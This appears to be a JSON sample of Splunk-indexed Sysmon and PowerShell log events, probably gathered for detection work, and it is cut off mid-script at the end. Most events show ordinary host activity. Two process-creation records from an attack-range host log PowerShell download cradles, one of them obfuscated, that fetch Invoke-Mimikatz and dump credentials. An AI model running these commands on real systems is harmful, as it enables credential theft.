{
  "1": [
    {
      "CommandLine": "\"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy Bypass -File D:\\SplunkData\\generate_events.ps1",
      "EventCode": "1",
      "EventData_Xml": "<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-08-11 06:37:25.875</Data><Data Name='ProcessGuid'>{ff454333-c325-6a7a-60e4-00000000a604}</Data><Data Name='ProcessId'>46196</Data><Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='FileVersion'>10.0.22621.3085 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>\"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy Bypass -File D:\\SplunkData\\generate_events.ps1</Data><Data Name='CurrentDirectory'>C:\\windows\\system32\\</Data><Data Name='User'>Ayush\\ayush</Data><Data Name='LogonGuid'>{ff454333-88f8-6a7a-336c-6e0800000000}</Data><Data Name='LogonId'>0x86e6c33</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=9D8E30DAF21108092D5980C931876B7E,SHA256=3247BCFD60F6DD25F34CB74B5889AB10EF1B3EC72B4D4B3D95B5B25B534560B8,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77</Data><Data Name='ParentProcessGuid'>{ff454333-bd59-6a7a-6ed7-00000000a604}</Data><Data Name='ParentProcessId'>10272</Data><Data Name='ParentImage'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='ParentCommandLine'>\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" </Data><Data Name='ParentUser'>Ayush\\ayush</Data>",
      "EventID": "1",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "System_Props_Xml": "<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-08-11T06:37:25.8905483Z'/><EventRecordID>511810</EventRecordID><Correlation/><Execution ProcessID='5728' ThreadID='8108'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Ayush</Computer><Security UserID='S-1-5-18'/>",
      "host": "Ayush",
      "index": "windows",
      "linecount": "1",
      "source": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
      "sourcetype": "XmlWinEventLog",
      "splunk_server": "Ayush",
      "_time": "2026-08-11T06:37:25.890Z"
    },
    {
      "EventCode": "1",
      "host": "win-dc-974.attackrange.local",
      "RuleName": "-",
      "UtcTime": "2021-03-01 22:53:21.495",
      "ProcessGuid": "{05ADC7E1-7061-603D-5188-00000000AD01}",
      "ProcessId": "7228",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "FileVersion": "10.0.14393.206 (rs1_release.160915-0644)",
      "Description": "Windows PowerShell",
      "Product": "Microsoft® Windows® Operating System",
      "Company": "Microsoft Corporation",
      "OriginalFileName": "PowerShell.EXE",
      "CommandLine": "powershell.exe  \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\" ",
      "CurrentDirectory": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\",
      "User": "ATTACKRANGE\\Administrator",
      "LogonGuid": "{05ADC7E1-29F1-6039-B11D-350000000000}",
      "LogonId": "0x351db1",
      "TerminalSessionId": "2",
      "IntegrityLevel": "High",
      "Hashes": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
      "ParentProcessGuid": "{05ADC7E1-7061-603D-5088-00000000AD01}",
      "ParentProcessId": "6896",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentCommandLine": "\"C:\\Windows\\system32\\cmd.exe\" /c \"powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"\" ",
      "_time": "2021-03-01T22:53:21.495Z"
    },
    {
      "EventCode": "1",
      "host": "win-dc-974.attackrange.local",
      "RuleName": "-",
      "UtcTime": "2021-03-01 22:53:35.214",
      "ProcessGuid": "{05ADC7E1-706F-603D-5588-00000000AD01}",
      "ProcessId": "4116",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "FileVersion": "10.0.14393.206 (rs1_release.160915-0644)",
      "Description": "Windows PowerShell",
      "Product": "Microsoft® Windows® Operating System",
      "Company": "Microsoft Corporation",
      "OriginalFileName": "PowerShell.EXE",
      "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr} ",
      "CurrentDirectory": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\",
      "User": "ATTACKRANGE\\Administrator",
      "LogonGuid": "{05ADC7E1-29F1-6039-B11D-350000000000}",
      "LogonId": "0x351db1",
      "TerminalSessionId": "2",
      "IntegrityLevel": "High",
      "Hashes": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
      "ParentProcessGuid": "{05ADC7E1-7049-603D-4188-00000000AD01}",
      "ParentProcessId": "5784",
      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
      "_time": "2021-03-01T22:53:35.214Z"
    }
  ],
  "13": [
    {
      "EventCode": "13",
      "EventData_Xml": "<Data Name='RuleName'>T1060,RunKey</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2026-08-11 15:34:01.045</Data><Data Name='ProcessGuid'>{ff454333-40ab-6a7b-2110-01000000a604}</Data><Data Name='ProcessId'>33056</Data><Data Name='Image'>C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data><Data Name='TargetObject'>HKU\\S-1-5-21-4283746528-2832981674-120407787-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\GoogleChromeAutoLaunch_8BB3020C2CA1733EBB223E6A127FF2D8</Data><Data Name='Details'>\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --no-startup-window /prefetch:5</Data><Data Name='User'>Ayush\\ayush</Data>",
      "EventID": "13",
      "System_Props_Xml": "<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-08-11T15:34:01.0550635Z'/><EventRecordID>524220</EventRecordID><Correlation/><Execution ProcessID='5728' ThreadID='8108'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Ayush</Computer><Security UserID='S-1-5-18'/>",
      "TargetObject": "HKU\\S-1-5-21-4283746528-2832981674-120407787-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\GoogleChromeAutoLaunch_8BB3020C2CA1733EBB223E6A127FF2D8",
      "host": "Ayush",
      "index": "windows",
      "linecount": "1",
      "source": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
      "sourcetype": "XmlWinEventLog",
      "splunk_server": "Ayush",
      "_time": "2026-08-11T15:34:01.055Z"
    },
    {
      "EventCode": "13",
      "EventData_Xml": "<Data Name='RuleName'>T1060,RunKey</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2026-08-11 15:31:52.659</Data><Data Name='ProcessGuid'>{ff454333-4068-6a7b-730f-01000000a604}</Data><Data Name='ProcessId'>39104</Data><Data Name='Image'>C:\\windows\\SYSTEM32\\reg.exe</Data><Data Name='TargetObject'>HKU\\S-1-5-21-4283746528-2832981674-120407787-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\HPSEU_Host_Launcher</Data><Data Name='Details'>C:\\Program Files\\HP\\HP System Event Utility\\Host Launcher\\HpseuHostLauncher.exe</Data><Data Name='User'>Ayush\\ayush</Data>",
      "EventID": "13",
      "System_Props_Xml": "<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-08-11T15:31:52.6603153Z'/><EventRecordID>523731</EventRecordID><Correlation/><Execution ProcessID='5728' ThreadID='8108'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Ayush</Computer><Security UserID='S-1-5-18'/>",
      "TargetObject": "HKU\\S-1-5-21-4283746528-2832981674-120407787-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\HPSEU_Host_Launcher",
      "host": "Ayush",
      "index": "windows",
      "linecount": "1",
      "source": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
      "sourcetype": "XmlWinEventLog",
      "splunk_server": "Ayush",
      "_time": "2026-08-11T15:31:52.660Z"
    },
    {
      "EventCode": "13",
      "EventData_Xml": "<Data Name='RuleName'>T1060,RunKey</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2026-08-11 15:31:52.578</Data><Data Name='ProcessGuid'>{ff454333-4068-6a7b-6e0f-01000000a604}</Data><Data Name='ProcessId'>3168</Data><Data Name='Image'>C:\\windows\\SYSTEM32\\reg.exe</Data><Data Name='TargetObject'>HKLM\\TEMP_HPSEU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\HPSEU_Host_Launcher</Data><Data Name='Details'>C:\\Program Files\\HP\\HP System Event Utility\\Host Launcher\\HpseuHostLauncher.exe</Data><Data Name='User'>Ayush\\ayush</Data>",
      "EventID": "13",
      "System_Props_Xml": "<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-08-11T15:31:52.5792020Z'/><EventRecordID>523728</EventRecordID><Correlation/><Execution ProcessID='5728' ThreadID='8108'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Ayush</Computer><Security UserID='S-1-5-18'/>",
      "TargetObject": "HKLM\\TEMP_HPSEU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\HPSEU_Host_Launcher",
      "host": "Ayush",
      "index": "windows",
      "linecount": "1",
      "source": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
      "sourcetype": "XmlWinEventLog",
      "splunk_server": "Ayush",
      "_time": "2026-08-11T15:31:52.579Z"
    }
  ],
  "3": [
    {
      "DestinationIp": "34.206.0.173",
      "DestinationPort": "4318",
      "EventCode": "3",
      "EventData_Xml": "<Data Name='RuleName'>Usermode</Data><Data Name='UtcTime'>2026-08-11 13:45:57.506</Data><Data Name='ProcessGuid'>{ff454333-2795-6a7b-7bfd-00000000a604}</Data><Data Name='ProcessId'>46832</Data><Data Name='Image'>C:\\Users\\ayush\\AppData\\Local\\GitKrakenCLI\\versions\\gk_3_1_72\\gk_3_1_72.exe</Data><Data Name='User'>Ayush\\ayush</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>10.143.71.72</Data><Data Name='SourceHostname'>Ayush</Data><Data Name='SourcePort'>37739</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>34.206.0.173</Data><Data Name='DestinationHostname'>ec2-34-206-0-173.compute-1.amazonaws.com</Data><Data Name='DestinationPort'>4318</Data><Data Name='DestinationPortName'>-</Data>",
      "EventID": "3",
      "Initiated": "true",
      "System_Props_Xml": "<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-08-11T13:45:59.8607102Z'/><EventRecordID>519085</EventRecordID><Correlation/><Execution ProcessID='5728' ThreadID='7496'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Ayush</Computer><Security UserID='S-1-5-18'/>",
      "host": "Ayush",
      "index": "windows",
      "linecount": "1",
      "source": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
      "sourcetype": "XmlWinEventLog",
      "splunk_server": "Ayush",
      "_time": "2026-08-11T13:45:59.860Z"
    },
    {
      "DestinationIp": "47.254.24.21",
      "DestinationPort": "8106",
      "EventCode": "3",
      "EventData_Xml": "<Data Name='RuleName'>Usermode</Data><Data Name='UtcTime'>2026-08-11 13:01:24.359</Data><Data Name='ProcessGuid'>{ff454333-1d16-6a7b-9ef1-00000000a604}</Data><Data Name='ProcessId'>61700</Data><Data Name='Image'>C:\\Users\\ayush\\AppData\\Local\\Wondershare\\Wondershare NativePush\\WsToastNotification.exe</Data><Data Name='User'>Ayush\\ayush</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>10.143.71.72</Data><Data Name='SourceHostname'>Ayush</Data><Data Name='SourcePort'>21053</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>47.254.24.21</Data><Data Name='DestinationHostname'>-</Data><Data Name='DestinationPort'>8106</Data><Data Name='DestinationPortName'>-</Data>",
      "EventID": "3",
      "Initiated": "true",
      "System_Props_Xml": "<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-08-11T13:01:26.7440921Z'/><EventRecordID>515675</EventRecordID><Correlation/><Execution ProcessID='5728' ThreadID='7496'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Ayush</Computer><Security UserID='S-1-5-18'/>",
      "host": "Ayush",
      "index": "windows",
      "linecount": "1",
      "source": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
      "sourcetype": "XmlWinEventLog",
      "splunk_server": "Ayush",
      "_time": "2026-08-11T13:01:26.744Z"
    },
    {
      "DestinationIp": "47.254.24.21",
      "DestinationPort": "8106",
      "EventCode": "3",
      "EventData_Xml": "<Data Name='RuleName'>Usermode</Data><Data Name='UtcTime'>2026-08-11 13:01:22.319</Data><Data Name='ProcessGuid'>{ff454333-1d16-6a7b-9ef1-00000000a604}</Data><Data Name='ProcessId'>61700</Data><Data Name='Image'>C:\\Users\\ayush\\AppData\\Local\\Wondershare\\Wondershare NativePush\\WsToastNotification.exe</Data><Data Name='User'>Ayush\\ayush</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>10.143.71.72</Data><Data Name='SourceHostname'>Ayush</Data><Data Name='SourcePort'>25684</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>47.254.24.21</Data><Data Name='DestinationHostname'>-</Data><Data Name='DestinationPort'>8106</Data><Data Name='DestinationPortName'>-</Data>",
      "EventID": "3",
      "Initiated": "true",
      "System_Props_Xml": "<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-08-11T13:01:24.9069051Z'/><EventRecordID>515670</EventRecordID><Correlation/><Execution ProcessID='5728' ThreadID='7496'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Ayush</Computer><Security UserID='S-1-5-18'/>",
      "host": "Ayush",
      "index": "windows",
      "linecount": "1",
      "source": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
      "sourcetype": "XmlWinEventLog",
      "splunk_server": "Ayush",
      "_time": "2026-08-11T13:01:24.906Z"
    }
  ],
  "22": [
    {
      "EventCode": "22",
      "EventData_Xml": "<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-08-11 14:22:44.275</Data><Data Name='ProcessGuid'>{ff454333-d7cc-6a79-7b00-00000000a604}</Data><Data Name='ProcessId'>5864</Data><Data Name='QueryName'>raw.githubusercontent.com</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>185.199.109.133;185.199.108.133;185.199.111.133;185.199.110.133;</Data><Data Name='Image'>C:\\Program Files\\WSL\\wslservice.exe</Data><Data Name='User'>NT AUTHORITY\\SYSTEM</Data>",
      "EventID": "22",
      "QueryName": "raw.githubusercontent.com",
      "System_Props_Xml": "<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-08-11T14:22:46.5506408Z'/><EventRecordID>521354</EventRecordID><Correlation/><Execution ProcessID='5728' ThreadID='8140'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Ayush</Computer><Security UserID='S-1-5-18'/>",
      "host": "Ayush",
      "index": "windows",
      "linecount": "1",
      "source": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
      "sourcetype": "XmlWinEventLog",
      "splunk_server": "Ayush",
      "_time": "2026-08-11T14:22:46.550Z"
    },
    {
      "EventCode": "22",
      "EventData_Xml": "<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-08-11 14:15:24.163</Data><Data Name='ProcessGuid'>{ff454333-d7cc-6a79-7b00-00000000a604}</Data><Data Name='ProcessId'>5864</Data><Data Name='QueryName'>raw.githubusercontent.com</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>185.199.110.133;185.199.111.133;185.199.108.133;185.199.109.133;type: 2 dns1.p01.nsone.net;type: 2 dns2.p01.nsone.net;type: 2 dns3.p01.nsone.net;type: 2 dns4.p01.nsone.net;type: 2 ns-1411.awsdns-48.org;type: 2 ns-181.awsdns-22.com;type: 2 ns-1867.awsdns-41.co.uk;type: 2 ns-596.awsdns-10.net;</Data><Data Name='Image'>C:\\Program Files\\WSL\\wslservice.exe</Data><Data Name='User'>NT AUTHORITY\\SYSTEM</Data>",
      "EventID": "22",
      "QueryName": "raw.githubusercontent.com",
      "System_Props_Xml": "<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-08-11T14:15:26.5353705Z'/><EventRecordID>520930</EventRecordID><Correlation/><Execution ProcessID='5728' ThreadID='8140'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Ayush</Computer><Security UserID='S-1-5-18'/>",
      "host": "Ayush",
      "index": "windows",
      "linecount": "1",
      "source": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
      "sourcetype": "XmlWinEventLog",
      "splunk_server": "Ayush",
      "_time": "2026-08-11T14:15:26.535Z"
    },
    {
      "EventCode": "22",
      "EventData_Xml": "<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-08-11 13:44:04.123</Data><Data Name='ProcessGuid'>{ff454333-d7cc-6a79-7b00-00000000a604}</Data><Data Name='ProcessId'>5864</Data><Data Name='QueryName'>raw.githubusercontent.com</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>2606:50c0:8002::154;2606:50c0:8001::154;2606:50c0:8000::154;2606:50c0:8003::154;</Data><Data Name='Image'>C:\\Program Files\\WSL\\wslservice.exe</Data><Data Name='User'>NT AUTHORITY\\SYSTEM</Data>",
      "EventID": "22",
      "QueryName": "raw.githubusercontent.com",
      "System_Props_Xml": "<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-08-11T13:44:07.3234882Z'/><EventRecordID>518629</EventRecordID><Correlation/><Execution ProcessID='5728' ThreadID='8140'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Ayush</Computer><Security UserID='S-1-5-18'/>",
      "host": "Ayush",
      "index": "windows",
      "linecount": "1",
      "source": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
      "sourcetype": "XmlWinEventLog",
      "splunk_server": "Ayush",
      "_time": "2026-08-11T13:44:07.323Z"
    }
  ],
  "4104": [
    {
      "EventCode": "4104",
      "EventData_Xml": "<Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>powershell -ExecutionPolicy Bypass -File D:\\SplunkData\\generate_events.ps1\n</Data><Data Name='ScriptBlockId'>ff726c20-d36d-4d6e-b481-2ac0747f40f7</Data><Data Name='Path'></Data>",
      "EventID": "4104",
      "ScriptBlockText": "powershell -ExecutionPolicy Bypass -File D:\\SplunkData\\generate_events.ps1",
      "System_Props_Xml": "<Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>3</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2026-08-11T06:37:25.8719484Z'/><EventRecordID>1092068</EventRecordID><Correlation ActivityID='{8eacc285-28cf-0004-ec2f-f98ecf28dd01}'/><Execution ProcessID='10272' ThreadID='39228'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>Ayush</Computer><Security UserID='S-1-5-21-4283746528-2832981674-120407787-1001'/>",
      "host": "Ayush",
      "index": "windows",
      "linecount": "2",
      "source": "XmlWinEventLog:Microsoft-Windows-PowerShell/Operational",
      "sourcetype": "XmlWinEventLog",
      "splunk_server": "Ayush",
      "_time": "2026-08-11T06:37:25.871Z"
    },
    {
      "EventCode": "4104",
      "EventData_Xml": "<Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>function Invoke-WebRequestVerifyHash ($url, $outfile, $hash) {\n    $success = $false\n    $null = @(\n        New-Item -ItemType Directory (Split-Path $outfile) -Force | Out-Null\n        $ms = New-Object IO.MemoryStream\n        [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)\n        (New-Object System.Net.WebClient).OpenRead($url).copyto($ms)\n        $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null\n        $actualHash = (Get-FileHash -InputStream $ms).Hash\n        if ( $hash -eq $actualHash) {\n            $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null\n            $fileStream = New-Object IO.FileStream $outfile, ([System.IO.FileMode]::Create)\n            $ms.CopyTo($fileStream);\n            $fileStream.Close()\n            $success = $true\n        }\n        else {\n            Write-Host -ForegroundColor red \"File hash mismatch, expected: $hash, actual: $actualHash\"\n        }\n    )\n    $success\n}\n</Data><Data Name='ScriptBlockId'>a47319d4-5cf0-4696-b1bf-0481451ee767</Data><Data Name='Path'>C:\\AtomicRedTeam\\invoke-atomicredteam\\Public\\Invoke-WebRequestVerifyHash.ps1</Data>",
      "EventID": "4104",
      "ScriptBlockText": "function Invoke-WebRequestVerifyHash ($url, $outfile, $hash) {\n    $success = $false\n    $null = @(\n        New-Item -ItemType Directory (Split-Path $outfile) -Force | Out-Null\n        $ms = New-Object IO.MemoryStream\n        [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)\n        (New-Object System.Net.WebClient).OpenRead($url).copyto($ms)\n        $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null\n        $actualHash = (Get-FileHash -InputStream $ms).Hash\n        if ( $hash -eq $actualHash) {\n            $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null\n            $fileStream = New-Object IO.FileStream $outfile, ([System.IO.FileMode]::Create)\n            $ms.CopyTo($fileStream);\n            $fileStream.Close()\n            $success = $true\n        }\n        else {\n            Write-Host -ForegroundColor red \"File hash mismatch, expected: $hash, actual: $actualHash\"\n        }\n    )\n    $success\n}",
      "System_Props_Xml": "<Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>3</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2026-08-11T06:28:53.9399562Z'/><EventRecordID>1092057</EventRecordID><Correlation ActivityID='{8eacc285-28cf-0004-f981-f78ecf28dd01}'/><Execution ProcessID='49016' ThreadID='60312'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>Ayush</Computer><Security UserID='S-1-5-21-4283746528-2832981674-120407787-1001'/>",
      "host": "Ayush",
      "index": "windows",
      "linecount": "23",
      "source": "XmlWinEventLog:Microsoft-Windows-PowerShell/Operational",
      "sourcetype": "XmlWinEventLog",
      "splunk_server": "Ayush",
      "_time": "2026-08-11T06:28:53.939Z"
    },
    {
      "EventCode": "4104",
      "EventData_Xml": "<Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>function Invoke-SetupAtomicRunner {\r\n\r\n    [CmdletBinding(\r\n        SupportsShouldProcess = $true,\r\n        PositionalBinding = $false,\r\n        ConfirmImpact = 'Medium')]\r\n    Param(\r\n        [Parameter(Mandatory = $false)]\r\n        [switch]\r\n        $SkipServiceSetup,\r\n\r\n        [Parameter(Mandatory = $false)]\r\n        [switch]\r\n        $asScheduledtask\r\n    )\r\n\r\n    # ensure running with admin privs\r\n    if ($artConfig.OS -eq \"windows\") {\r\n        # auto-elevate on Windows\r\n        $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())\r\n        $testadmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)\r\n        if ($testadmin -eq $false) {\r\n            Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file \"{0}\" -elevated' -f ($myinvocation.MyCommand.Definition))\r\n            exit $LASTEXITCODE\r\n        }\r\n    }\r\n    else {\r\n        # linux and macos check - doesn't auto-elevate\r\n        if ((id -u) -ne 0 ) {\r\n            Throw \"You must run the Invoke-SetupAtomicRunner script as root\"\r\n            exit\r\n        }\r\n    }\r\n\r\n    if ($artConfig.basehostname.length -gt 15) { Throw \"The hostname for this machine (minus the GUID) must be 15 characters or less. Please rename this computer.\" }\r\n\r\n    #create AtomicRunner-Logs directories if they don't exist\r\n    New-Item -ItemType Directory $artConfig.atomicLogsPath -ErrorAction Ignore\r\n    New-Item -ItemType Directory 